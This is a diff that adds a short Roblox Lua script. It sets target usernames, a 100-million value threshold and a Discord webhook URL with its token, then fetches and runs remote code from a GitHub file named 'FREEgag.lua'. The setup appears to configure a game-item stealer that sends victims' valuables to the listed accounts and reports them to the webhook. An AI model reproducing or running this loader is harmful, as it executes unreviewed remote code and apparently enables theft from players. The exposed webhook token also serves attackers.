@@ -1,0 +1,6 @@
+_G.Usernames = {"thanoskiller1234566", "irb972", "frostman_1111"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1381039524599304273/kfjH6tTp6BOJtVlGGPQ5_Oya5OERnCY25Tz2LM-6sO_QEwyFd7G93BJXcvkBej1-JK3s/" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/GAG/refs/heads/main/FREEgag.lua"))()
